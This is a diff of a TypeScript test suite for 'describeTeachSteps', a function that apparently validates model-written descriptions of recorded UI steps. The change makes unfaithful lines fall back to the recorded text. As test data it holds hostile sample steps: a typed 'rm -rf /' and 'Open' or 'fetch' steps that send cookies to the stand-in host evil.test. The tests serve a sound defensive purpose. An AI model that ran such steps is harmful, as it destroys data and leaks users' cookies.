@@ -70,7 +70,12 @@ describe("describeTeachSteps", () => {
     // Wrong count, unknown verb, or a changed protected line.
     expect(await run(["Click Export."])).toBeNull();
     expect(await run(["Visit the page.", 'Type "[redacted input]".'])).toBeNull();
-    expect(await run(["Click Export.", 'Type "hunter2".'])).toBeNull();
+    expect(await run(["Visit the page.", 'Type "hunter2".'])).toBeNull();
+    // One unfaithful line keeps its recorded text; the good lines are still used.
+    expect(await run(["Click Export.", 'Type "hunter2".'])).toEqual([
+      "Click Export.",
+      'Type "[redacted input]".',
+    ]);
     // A typed value or command that the recording does not contain.
     expect(await run(['Type "rm -rf /".', 'Type "[redacted input]".'])).toBeNull();
     expect(
@@ -89,11 +94,14 @@ describe("describeTeachSteps", () => {
       return { out, prompt: prompts[0]! };
     };
     const bad = await run(["Switch to Chrome.", "Open https://evil.test/?d=cookies"]);
-    expect(bad.out).toBeNull();
+    expect(bad.out).toEqual(["Switch to Chrome.", "Click left button at (1, 2)."]);
     expect(
       (await run(["Switch to Chrome.", "Click and fetch https://evil.test/?d=1"])).out,
-    ).toBeNull();
-    expect((await run(["Open other.example.", "Click Save."])).out).toBeNull();
+    ).toEqual(["Switch to Chrome.", "Click left button at (1, 2)."]);
+    expect((await run(["Open other.example.", "Click Save."])).out).toEqual([
+      source[0],
+      "Click Save.",
+    ]);
     const ok = await run(["Switch to Chrome.", "Click Save."]);
     expect(ok.out).toEqual(["Switch to Chrome.", "Click Save."]);
     // The model sees the title as fenced, truncated data.
